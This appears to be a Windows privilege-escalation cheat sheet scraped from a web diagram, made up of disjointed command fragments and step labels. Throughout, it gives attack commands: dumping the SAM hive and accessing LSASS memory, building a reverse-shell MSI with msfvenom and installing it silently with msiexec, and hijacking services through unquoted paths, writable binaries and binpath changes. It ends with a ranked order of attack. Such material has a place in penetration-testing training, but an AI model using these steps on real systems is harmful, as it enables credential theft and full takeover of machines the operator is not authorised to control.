div.span:
systeminfo
wmic qfe list
Check for missing patches

Compile/upload exploit
Execute for SYSTEM shell

Copy SAM & SYSTEM hives
reg save HKLM\\SAM

Inject into SYSTEM process
LSASS memory access

Query both registry keys:
HKCU & HKLM\\SOFTWARE\\Policies\\
Microsoft\\Windows\\Installer

msfvenom -p windows/x64/
shell_reverse_tcp -f msi
msiexec /quiet /qn /i malicious.msi

schtasks /query /fo LIST /v
Find tasks with writable binaries

wmic service get name,pathname
Find paths with spaces, no quotes

Write malicious exe to path
Restart service

Get-ACL service registry keys
Check for Modify/Write access

Modify service binary path:
sc config service binpath

icacls service.exe
Check for Write permissions

Replace binary with payload
Restart service

Check OS version:
systeminfo
wmic os get caption

Enumerate services:
Get-Service
wmic service list

RECOMMENDED ORDER:
1. Check token privileges first - SeImpersonate = quick win
2. Enumerate services - Common misconfiguration
3. Search credentials
4. Kernel exploits last - Risky may crash system
